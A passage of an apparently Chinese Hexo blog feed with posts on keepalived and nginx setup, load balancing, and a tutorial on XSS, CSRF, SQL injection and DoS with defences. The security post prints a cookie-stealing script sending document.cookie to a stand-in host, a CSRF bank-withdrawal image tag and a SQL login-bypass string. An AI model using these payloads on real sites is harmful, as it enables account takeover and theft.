class="hljs-number">2</span>、首先创建文件夹，将keepalived配置文件进行复制：<span class="hljs-number">3</span>、mkdir /etc/keepalived<span class="hljs-number">4</span>、cd /usr/local/keepalived-<span class="hljs-number">1.2</span>.<span class="hljs-number">18</span>cp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived/  然后复制keepalived脚本文件：  cp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/  cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/  ln -s /usr/local/sbin/keepalived /usr/sbin/  ln -s /usr/local/keepalived/sbin/keepalived /sbin/  可以设置开机启动：chkconfig keepalived on</code></pre><h3 id="4、修改配置文件"><a href="#4、修改配置文件" class="headerlink" title="4、修改配置文件"></a>4、修改配置文件</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、cd /etc/keepalived/<span class="hljs-number">2</span>、修改keeplived.conf 配置高可用文件<span class="hljs-number">3</span>、添加nginx_check.sh脚本(重启Nginx脚本)</code></pre><pre><code class="hljs java">! Configuration File <span class="hljs-keyword">for</span> keepalivedvrrp_script chk_nginx &#123;    script &quot;/etc/keepalived/nginx_check.sh&quot; #运行脚本，脚本内容下面有，就是起到一个nginx宕机以后，自动开启服务    interval 2 #检测时间间隔    weight -20 #如果条件成立的话，则权重 -20&#125;# 定义虚拟路由，VI_1 为虚拟路由的标示符，自己定义名称vrrp_instance VI_1 &#123;    state MASTER #来决定主从   BACKUP是从    <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">eth0</span> # 绑定虚拟 <span class="hljs-title">IP</span> 的网络接口，根据自己的机器填写 指令<span class="hljs-title">ip</span> <span class="hljs-title">a</span> 查看</span><span class="hljs-class">    <span class="hljs-title">virtual_router_id</span> 121 # 虚拟路由的 <span class="hljs-title">ID</span> 号， 两个节点设置必须一样</span><span class="hljs-class">    <span class="hljs-title">mcast_src_ip</span> 47.93.223.237 #填写本机<span class="hljs-title">ip</span></span><span class="hljs-class">    <span class="hljs-title">priority</span> 100 # 节点优先级,主要比从节点优先级高</span><span class="hljs-class">    <span class="hljs-title">nopreempt</span> # 优先级高的设置 <span class="hljs-title">nopreempt</span> 解决异常恢复后再次抢占的问题</span><span class="hljs-class">    <span class="hljs-title">advert_int</span> 1 # 组播信息发送间隔，两个节点设置必须一样，默认 1<span class="hljs-title">s</span></span><span class="hljs-class">    <span class="hljs-title">authentication</span> </span>&#123;        auth_type PASS        auth_pass <span class="hljs-number">1111</span>    &#125;    # 将 track_script 块加入 instance 配置块    track_script &#123;        chk_nginx #执行 Nginx 监控的服务    &#125;    virtual_ipaddress &#123;        192.168.110.110 # 虚拟ip,也就是解决写死程序的ip怎么能切换的ip,也可扩展，用途广泛。可配置多个。    &#125;&#125;</code></pre><pre><code class="hljs java">#!/bin/bashA=`ps -C nginx ¨Cno-header |wc -l`<span class="hljs-keyword">if</span> [ $A -eq <span class="hljs-number">0</span> ];then    /usr/local/nginx/sbin/nginx    sleep <span class="hljs-number">2</span>    <span class="hljs-keyword">if</span> [ `ps -C nginx --no-header |wc -l` -eq <span class="hljs-number">0</span> ];then        killall keepalived    fifi</code></pre><h3 id="5、常用指令"><a href="#5、常用指令" class="headerlink" title="5、常用指令"></a>5、常用指令</h3><pre><code class="hljs java">service keepalived start # 启动service keepalived stop  # 关闭</code></pre><p>流程图</p><img src="/images/Keepalived流程图.jpg" style="zoom:50%;" /><h3 id="6、常见问题"><a href="#6、常见问题" class="headerlink" title="6、常见问题"></a>6、常见问题</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、如果nginx服务器宕机后，Keepalived没有重启ngxin，有可能是脚本没有权限重启进入文件夹后，chmod <span class="hljs-number">777</span> nginx_check.sh</code></pre>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>企业级应用</tag>
      
      <tag>nginx</tag>
      
      <tag>keepalived</tag>
      
      <tag>高可用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-Liunx安装</title>
    <link href="/2020/04/16/Nginx%E9%AB%98%E7%BA%A7/"/>
    <url>/2020/04/16/Nginx%E9%AB%98%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="Nginx高级"><a href="#Nginx高级" class="headerlink" title="Nginx高级"></a>Nginx高级</h1><h1 id="一、Liunx安装Nginx"><a href="#一、Liunx安装Nginx" class="headerlink" title="一、Liunx安装Nginx"></a>一、Liunx安装Nginx</h1><p><strong>安装必要的库（nginx 中gzip模块需要 zlib 库，rewrite模块需要 pcre 库，ssl 功能需要openssl库）</strong></p><p>1、安装PCRE库</p><pre><code class="hljs java">cd /usr/local/wget ftp:<span class="hljs-comment">//ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.36.tar.gz</span>tar -zxvf pcre-<span class="hljs-number">8.36</span>.tar.gzcd pcre-<span class="hljs-number">8.36</span>./configuremakemake install  ./configure 报错 【error: You need a C++ compiler <span class="hljs-keyword">for</span> C++ support.】安装 yum install -y gcc gcc-c++然后重新 ./configure</code></pre><p>2、安装zlib库</p><pre><code class="hljs java">cd /usr/local/ wget http:<span class="hljs-comment">//zlib.net/zlib-1.2.8.tar.gz</span>tar -zxvf zlib-<span class="hljs-number">1.2</span>.<span class="hljs-number">8.</span>tar.gzcd zlib-<span class="hljs-number">1.2</span>.<span class="hljs-number">8</span>./configuremakemake install</code></pre><p>3、安装ssl</p><pre><code class="hljs java">cd /usr/local/wget http:<span class="hljs-comment">//www.openssl.org/source/openssl-1.0.1j.tar.gz</span>tar -zxvf openssl-<span class="hljs-number">1.0</span>.<span class="hljs-number">1</span>j.tar.gz./configmakemake install</code></pre><p>4、安装nginx</p><pre><code class="hljs java">cd /usr/local/wget http:<span class="hljs-comment">//nginx.org/download/nginx-1.8.0.tar.gz</span>tar -zxvf nginx-<span class="hljs-number">1.8</span>.<span class="hljs-number">0.</span>tar.gzcd nginx-<span class="hljs-number">1.8</span>.<span class="hljs-number">0</span>  ./configure --prefix=/usr/local/nginx makemake install</code></pre><p>5、常见错误：提示找不到libpcre.so.1</p><pre><code class="hljs java"><span class="hljs-number">32</span>位：ln -s /usr/local/lib/libpcre.so.<span class="hljs-number">1</span> /lib<span class="hljs-number">64</span>位：ln -s /usr/local/lib/libpcre.so.<span class="hljs-number">1</span> /lib64</code></pre><h1 id="二、测试启动"><a href="#二、测试启动" class="headerlink" title="二、测试启动"></a>二、测试启动</h1><pre><code class="hljs java">启动命令：/usr/local/nginx/sbin/nginx关闭防火墙，然后打开本地浏览器，访问服务器IP地址，显示 Welcome to Nginx！</code></pre><p><img src="/images/nginx-1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>企业级应用</tag>
      
      <tag>nginx</tag>
      
      <tag>高可用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx基础知识</title>
    <link href="/2020/04/15/Nginx%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/04/15/Nginx%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Nginx基础"><a href="#Nginx基础" class="headerlink" title="Nginx基础"></a>Nginx基础</h1><h1 id="一、什么是Nginx？"><a href="#一、什么是Nginx？" class="headerlink" title="一、什么是Nginx？"></a>一、什么是Nginx？</h1><p>1、nginx反向代理、代理服务器、静态服务器，</p><p>2、nginx作用：<strong>集群</strong>(减轻单台服务器压力)、<strong>反向代理</strong>(不暴露真实IP地址)、<strong>虚拟服务器</strong>、<strong>静态服务器</strong>(动静分离)</p><p>3、nginx优点：性能优秀，同时5wan并发，内存小，轻量级服务器</p><p>4、安全架构问题，如何解决</p><ul><li>nginx反向代理(不暴露真是IP地址)</li><li>使用Https防止抓包分析Http请求</li><li>搭建企业黑名单和白名单系统（防盗链）</li><li>模拟请求（csrf 业务攻击）、XSS、sql注入</li><li>ddos（流量攻击，占用宽带，影响用户正常使用）</li><li>CDN加速</li></ul><p>5、反向代理服务器</p><p>​     lvs、F5、haproxy</p><h1 id="二、安装Nginx"><a href="#二、安装Nginx" class="headerlink" title="二、安装Nginx"></a>二、安装Nginx</h1><h1 id="三、Nginx实现反向代理"><a href="#三、Nginx实现反向代理" class="headerlink" title="三、Nginx实现反向代理"></a>三、Nginx实现反向代理</h1><h2 id="1、什么是反向代理？"><a href="#1、什么是反向代理？" class="headerlink" title="1、什么是反向代理？"></a>1、什么是反向代理？</h2><p>客户端——&gt; 反向代理服务器nginx ——&gt; tomcat服务器集群</p><p>nginx和tomcat属于同一个网络，nginx向外暴露外网ip,采用负载均衡机制（权重、轮询、IP绑定），调用tomcat服务集群，nginx和tomcat之间的通信属于内网访问，保证了tomcat的安全性。</p><h2 id="2、-在集群会产生什么情况？"><a href="#2、-在集群会产生什么情况？" class="headerlink" title="2、 在集群会产生什么情况？"></a>2、 在集群会产生什么情况？</h2><ul><li>分布式job幂等性(重复)问题，使用XXLjob分布式任务调度平台</li><li>回话共享问题</li><li>分布式生成全局ID （比如生成订单号，使用时间戳，集群情况下会出现幂等性问题。解决方案：提前生成好订单号，放到redis缓存中，或者使用分布式锁，同时只能一个执行）</li></ul><h2 id="3、配置反向代理"><a href="#3、配置反向代理" class="headerlink" title="3、配置反向代理"></a>3、配置反向代理</h2><p><strong>location / 表示拦截所有请求</strong></p><pre><code class="hljs xml">&#123;  listen       80;    server_name  localhost;        location / &#123;                  proxy_pass   https://www.baidu.com;        index  index.html index.htm;&#125;</code></pre><p>监听 localhost:80端口，location/ 拦截所有请求，然后跳转到<a href="http://www.baidu.com,默认访问index.html页面/">www.baidu.com，默认访问index.html页面</a></p><h1 id="四、负载均衡"><a href="#四、负载均衡" class="headerlink" title="四、负载均衡"></a>四、负载均衡</h1><p>负载均衡：提高网站吞吐量（接收响应），减少单台服务压力</p><p>nginx负载均衡 算法、轮询机制（服务器性能一样）、权重（服务器性能不一样）、IP绑定（只让一个IP地址进行访问，解决会话共享问题）</p><h2 id="1、轮询机制"><a href="#1、轮询机制" class="headerlink" title="1、轮询机制"></a>1、轮询机制</h2><pre><code class="hljs xml">upstream backserver &#123; server 192.168.0.14; server 192.168.0.15; &#125;&#123;  listen       80;    server_name  localhost;        location / &#123;        proxy_pass  https://backserver;        index  index.html index.htm;&#125;</code></pre><h2 id="2、权重机制"><a href="#2、权重机制" class="headerlink" title="2、权重机制"></a>2、权重机制</h2><pre><code class="hljs xml">upstream backserver &#123; server 192.168.0.14 weight=5;  // 只是比例关系，不是次数问题，其实是1:2server 192.168.0.15 weight=10; &#125;</code></pre><h2 id="3、IP绑定"><a href="#3、IP绑定" class="headerlink" title="3、IP绑定"></a>3、IP绑定</h2><pre><code class="hljs xml">upstream backserver &#123; ip_hash; server 192.168.0.14; //一个IP地址会默认访问14server 192.168.0.15; &#125;</code></pre><h1 id="五、服务器宕机容错机制-高可用"><a href="#五、服务器宕机容错机制-高可用" class="headerlink" title="五、服务器宕机容错机制 高可用"></a>五、服务器宕机容错机制 高可用</h1><h2 id="1、服务器宕机怎么解决？"><a href="#1、服务器宕机怎么解决？" class="headerlink" title="1、服务器宕机怎么解决？"></a>1、服务器宕机怎么解决？</h2><p>nginx服务器：一主一备或者多主多备用</p><p>如果主备服务器都宕机了，使用高可用工具keepalive重启脚本，自动重启。</p><p>重启N多次后还是失败后，发送报警邮件。</p><p>如果tomcat服务器集群，有一个宕机了怎么解决？</p><pre><code class="hljs xml">server &#123;       listen       80;       server_name  www.itmayiedu.com;       location / &#123;          proxy_pass  http://backserver;        index  index.html index.htm;               proxy_connect_timeout 1; // 超时1秒后轮询到下一台服务器           proxy_send_timeout 1;           proxy_read_timeout 1;       &#125;&#125;</code></pre><h2 id="2、如何优雅的发布版本？"><a href="#2、如何优雅的发布版本？" class="headerlink" title="2、如何优雅的发布版本？"></a>2、如何优雅的发布版本？</h2><p>逐步更新版本，一主一备的更新。</p><h2 id="3、tomcat发布版本如何解决session失效问题？"><a href="#3、tomcat发布版本如何解决session失效问题？" class="headerlink" title="3、tomcat发布版本如何解决session失效问题？"></a>3、tomcat发布版本如何解决session失效问题？</h2><p>存放到redis中，或者持久化到数据库中</p><h1 id="六、使用Nginx搭建企业级API接口网关"><a href="#六、使用Nginx搭建企业级API接口网关" class="headerlink" title="六、使用Nginx搭建企业级API接口网关"></a>六、使用Nginx搭建企业级API接口网关</h1><h2 id="1、跨域问题"><a href="#1、跨域问题" class="headerlink" title="1、跨域问题"></a>1、跨域问题</h2><p>属于前端ajax访问请求域名与浏览器访问的域名地址不相同，存在跨越问题</p><p>如何解决？</p><ul><li>jsonp 不支持post请求，支持get</li><li>httpclient进行内部转发</li><li>使用http响应头允许跨域设置</li><li>使用nginx搭建企业api接口网关</li><li>使用SpringZULL接口网关</li></ul><h2 id="2、nginx搭建企业api接口网关原理"><a href="#2、nginx搭建企业api接口网关原理" class="headerlink" title="2、nginx搭建企业api接口网关原理"></a>2、nginx搭建企业api接口网关原理</h2><p>企业API接口网关原理：通过域名相同，项目不同，进行拦截，跳转到真是服务器中。</p><p>nginx接口网关，拦截所有请求，根据请求不同进行分发。（权限控制）</p><p>例:<a href="https://www.project.com/A">https://www.project.com/A</a> 访问，nginx拦截，转发到 tomcat-A服务器 <a href="http://localhost:8080/A">http://localhost:8080/A</a></p><h2 id="3、nginx搭建网关"><a href="#3、nginx搭建网关" class="headerlink" title="3、nginx搭建网关"></a>3、nginx搭建网关</h2><pre><code class="hljs xml">server &#123;        listen       80;        server_name  www.project.com;        location /A &#123;    proxy_pass   http://localhost:8080/A;  index  index.html index.htm;        &#125;    location /B &#123;    proxy_pass   http://localhost:8080/B;  index  index.html index.htm;        &#125;    &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>企业级应用</tag>
      
      <tag>nginx</tag>
      
      <tag>高可用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读书笔记-Redis深度历险</title>
    <link href="/2020/04/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-Redis%E6%B7%B1%E5%BA%A6%E5%8E%86%E9%99%A9/"/>
    <url>/2020/04/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-Redis%E6%B7%B1%E5%BA%A6%E5%8E%86%E9%99%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="读书笔记-Redis深度历险"><a href="#读书笔记-Redis深度历险" class="headerlink" title="读书笔记-Redis深度历险"></a>读书笔记-Redis深度历险</h1><h2 id="一、基础和应用篇"><a href="#一、基础和应用篇" class="headerlink" title="一、基础和应用篇"></a>一、基础和应用篇</h2>]]></content>
    
    
    <categories>
      
      <category>读书</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跨站脚本攻击</title>
    <link href="/2020/03/23/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <url>/2020/03/23/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<!-- GFM-TOC --><ul><li><a href="#%E4%B8%80%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">一、跨站脚本攻击</a></li><li><a href="#%E4%BA%8C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">二、跨站请求伪造</a></li><li><a href="#%E4%B8%89sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">三、SQL 注入攻击</a></li><li><a href="#%E5%9B%9B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">四、拒绝服务攻击</a></li><li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a><!-- GFM-TOC --></li></ul><h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>之后该内容可能会被渲染成以下形式：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h2 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-设置-Cookie-为-HttpOnly"><a href="#1-设置-Cookie-为-HttpOnly" class="headerlink" title="1. 设置 Cookie 为 HttpOnly"></a>1. 设置 Cookie 为 HttpOnly</h3><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><h3 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h3><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">alert(<span class="hljs-regexp">/xss/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>form<span class="hljs-symbol">&amp;gt;</span>  <span class="hljs-symbol">&amp;lt;</span>input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>/form<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="hljs-symbol">&amp;gt;</span>alert(/xss/);<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span></code></pre><blockquote><p><a href="http://jsxss.com/zh/try.html">XSS 过滤在线测试</a></p></blockquote><h1 id="二、跨站请求伪造"><a href="#二、跨站请求伪造" class="headerlink" title="二、跨站请求伪造"></a>二、跨站请求伪造</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.examplebank.com/withdraw?account=AccoutName&amp;amount=<span class="hljs-number">1000</span>&amp;<span class="hljs-keyword">for</span>=PayeeName。</code></pre><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><pre><code class="hljs dts"><span class="hljs-params">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice<span class="hljs-variable">&amp;amount</span>=<span class="hljs-number">1000</span><span class="hljs-variable">&amp;for</span>=Badman&quot;&gt;</span>。</code></pre><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h2 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h3><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><h3 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h3><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><h3 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h3><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h1 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p><pre><code class="hljs sql">strSQL = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> (<span class="hljs-keyword">name</span> = <span class="hljs-string">&#x27;&quot; + userName + &quot;&#x27;</span>) <span class="hljs-keyword">and</span> (pw = <span class="hljs-string">&#x27;&quot;+ passWord +&quot;&#x27;</span>);&quot;</code></pre><p>如果填入以下内容：</p><pre><code class="hljs sql">userName = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;passWord = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;</code></pre><p>那么 SQL 查询字符串为：</p><pre><code class="hljs sql">strSQL = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> (<span class="hljs-keyword">name</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">and</span> (pw = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>);&quot;</code></pre><p>此时无需验证通过就能执行以下查询：</p><pre><code class="hljs sql">strSQL = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>;&quot;</code></pre><h2 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><pre><code class="hljs java">PreparedStatement stmt = connection.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span>);stmt.setString(<span class="hljs-number">1</span>, userid);stmt.setString(<span class="hljs-number">2</span>, password);ResultSet rs = stmt.executeQuery();</code></pre><h3 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h3><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h1 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">维基百科：跨站脚本</a></li><li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">维基百科：SQL 注入攻击</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">维基百科：跨站点请求伪造</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">维基百科：拒绝服务攻击</a></li></ul><div align="center"><img width="320px" src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/githubio/公众号二维码-2.png"></img></div>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建hexo博客</title>
    <link href="/2020/03/23/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/03/23/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/</url>
    
